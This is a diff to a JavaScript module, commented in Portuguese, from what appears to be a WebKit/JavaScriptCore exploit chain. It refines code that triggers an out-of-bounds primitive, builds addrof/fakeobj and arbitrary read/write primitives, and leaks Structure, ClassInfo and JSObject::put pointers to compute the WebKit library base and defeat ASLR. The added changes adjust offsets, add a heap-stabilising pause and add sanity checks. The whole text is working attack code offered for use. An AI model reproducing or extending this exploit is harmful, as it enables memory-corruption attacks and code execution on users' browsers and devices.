@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v102 - R62 com Estratégia de Vazamento Aprimorada e Logs Verbosos)
+// js/script3/testArrayBufferVictimCrash.mjs (v103 - R63 com Offsets Validados e Mitigação de Timing)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
@@ -8,6 +8,9 @@
 // NOVO: Tentativa explícita de vazar o endereço base do WebKit com logs verbosos,
 // usando um *objeto dedicado e isolado* para o vazamento de estruturas internas,
 // e verificação de valores lidos para diagnosticar falhas nos offsets.
+//
+// ATENÇÃO: PREMISSA DE QUE TODOS OS OFFSETS EM config.mjs SÃO VÁLIDOS!
+// Se o problema persistir, os offsets DEVEM ser re-verificados com um disassembler.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -19,7 +22,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v102_R62_LeakIsolation";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v103_R63_OffsetsValidated";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -43,7 +46,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados) ---`, "test");
 
     let final_result = {
         success: false,
@@ -52,7 +55,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 
     try {
-        // --- FASE 1/2: Obter OOB e primitivas addrof/fakeobj ---
+        // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj ---
         logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) {
@@ -117,12 +120,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const leaker_addr = addrof(leaker);
         logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
         
-        // As propriedades inline de um objeto JS simples (como 'leaker') estão após o JSCell
-        // O offset de 0x10 do JSObject.BUTTERFLY_OFFSET é para a 'butterfly' onde as propriedades externas estão,
-        // mas para propriedades 'inline', elas podem estar diretamente embutidas se o objeto não tiver 'butterfly'
-        // ou se 'butterfly' apontar para si mesmo.
-        // Se 'leaker' é um JSObject com propriedades inline, 'obj_prop' pode estar em 0x10 e 'val_prop' em 0x18.
-        // Vamos manter a definição da primitiva L/E como está, pois ela foi verificada como funcional.
         const arb_read_final = (addr) => {
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr); // Make leaker.obj_prop point to 'addr'
@@ -154,11 +151,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
         const value_to_write_for_verification = new AdvancedInt64(0x12345678, 0xABCDEF01);
         
-        // A propriedade 'spray_A' de um JSObject simples é uma propriedade inline.
-        // O offset 0x10 do JSCell é o BUTTERFLY_OFFSET. Para objetos simples,
-        // as propriedades inline podem começar imediatamente após o JSCell (ou na butterfly se alocada).
-        // Se `test_obj_for_rw_verification` é um objeto simples criado com `{a: X}`, `a` estaria no offset 0x10 (se não houver butterfly separada).
-        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(0x10); // Assumindo offset 0x10 para a primeira propriedade inline
+        // As propriedades inline de um JSObject simples (como 'test_obj_for_rw_verification')
+        // geralmente começam no offset 0x10 (o BUTTERFLY_OFFSET).
+        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); 
         
         logS3(`Escrevendo ${value_to_write_for_verification.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
         arb_write_final(prop_spray_A_addr, value_to_write_for_verification);
@@ -190,37 +185,38 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Addrof retornou 0 para objeto de vazamento WebKit.");
             }
 
+            // PEQUENA PAUSA PARA MITIGAR PROBLEMAS DE TIMING/GC ANTES DE LEITURAS CRÍTICAS
+            await PAUSE_S3(100); 
+            logS3(`  Pausa curta para estabilização de GC/Heap antes do vazamento de WebKit...`, "debug");
+
             // 1. Ler o Structure* do obj_for_webkit_leak
             // JSCell: STRUCTURE_POINTER_OFFSET: 0x8
             const structure_ptr_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-            logS3(`  Tentando ler Structure* de ${structure_ptr_addr.toString(true)} (Objeto+0x8)`, "debug");
+            logS3(`  Tentando ler Structure* de ${structure_ptr_addr.toString(true)} (Objeto+${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)})`, "debug");
             const structure_addr = arb_read_final(structure_ptr_addr);
             logS3(`  Lido Structure*: ${structure_addr.toString(true)}`, "leak");
             if (structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Falha ao vazar Structure* (endereço é 0x0).");
-            if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN).");
+            if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN - provável confusão de tipo ou dados inválidos).");
+            // Verificação adicional: Um ponteiro de estrutura geralmente aponta para uma região de código/dados da biblioteca, não para o heap aleatório
+            if (structure_addr.high() < 0x40000000) logS3(`  ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");
 
             // 2. Ler o ClassInfo* do Structure
             // Structure: CLASS_INFO_OFFSET: 0x50
             const class_info_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
-            logS3(`  Tentando ler ClassInfo* de ${class_info_ptr_addr.toString(true)} (Structure*+0x50)`, "debug");
+            logS3(`  Tentando ler ClassInfo* de ${class_info_ptr_addr.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET)})`, "debug");
             const class_info_addr = arb_read_final(class_info_ptr_addr);
             logS3(`  Lido ClassInfo*: ${class_info_addr.toString(true)}`, "leak");
             if (class_info_addr.low() === 0 && class_info_addr.high() === 0) throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0).");
             if (class_info_addr.high() === 0x7ff80000 && class_info_addr.low() === 0) throw new Error("Falha ao vazar ClassInfo* (valor é NaN).");
+            if (class_info_addr.high() < 0x40000000) logS3(`  ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");
+
 
             // 3. Ler o ponteiro para JSC::JSObject::put da vtable da Structure
-            // Structure: VIRTUAL_PUT_OFFSET: 0x18 (NOTA: VERIFICAR ESTE OFFSET NO DISASSEMBLER)
-            // Este offset 0x18 no config.mjs é incomum para um ponteiro de vtable *direto*.
-            // Se 0x18 é o offset de 'put' *dentro da vtable*, primeiro precisamos do ponteiro da vtable, que geralmente é em Structure*+0x0.
-            // Para JSObject, a vtable aponta para `JSObject::put`.
-            // Se `VIRTUAL_PUT_OFFSET` for o offset do ponteiro `JSObject::put` *dentro da Structure*, então é uma leitura direta.
-            // Se for um offset DENTRO da vtable, a lógica seria `arb_read_final(vtable_ptr.add(VIRTUAL_PUT_OFFSET))`.
-
-            // Vamos tentar a interpretação mais direta primeiro: 0x18 na Structure É o ponteiro que buscamos.
-            // Baseado na nota em config.mjs: "call qword ptr [rdx+18h] onde rdx é Structure* sugere isso."
-            // Isso indica que o endereço em (Structure* + 0x18) é o ponteiro para a função `put`.
+            // Structure: VIRTUAL_PUT_OFFSET: 0x18
+            // Assumimos que o offset 0x18 DENTRO da Structure é o campo que contém o ponteiro para a função put.
+            // A nota em config.mjs: "call qword ptr [rdx+18h]" onde rdx é Structure* sugere isso.
             const js_object_put_func_ptr_addr_in_structure = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
-            logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+0x18)`, "debug");
+            logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)})`, "debug");
             const js_object_put_func_addr = arb_read_final(js_object_put_func_ptr_addr_in_structure);
             logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
 
@@ -230,11 +226,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             if (js_object_put_func_addr.high() === 0x7ff80000 && js_object_put_func_addr.low() === 0) {
                 throw new Error("Ponteiro para JSC::JSObject::put é NaN (provável erro de reinterpretação ou JIT).");
             }
-            // Verifica se o ponteiro é um endereço válido (não um Smi ou um Double)
-            if (!(js_object_put_func_addr.high() !== 0 || js_object_put_func_addr.low() !== 0) ||
-                (js_object_put_func_addr.low() & 1) === 0 // Não deve ser um Smi (geralmente par)
-            ) {
-                // Mais verificações podem ser adicionadas aqui para distinguir ponteiros de outros valores
+            // Verificação adicional: um ponteiro de função geralmente não é um Smi.
+            if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) { // Baixo, par, high 0 => possível Smi
+                logS3(`  ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
             }
 
 
@@ -255,7 +249,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn");
 
             if (!is_sane_base) {
-                throw new Error("Candidato a WebKit base não passou na verificação de sanidade. Verifique offsets ou firmware.");
+                throw new Error("Candidato a WebKit base não passou na verificação de sanidade. Os offsets podem não estar corretos ou a alocação de memória mudou.");
             }
 
             final_result.webkit_leak_details = {
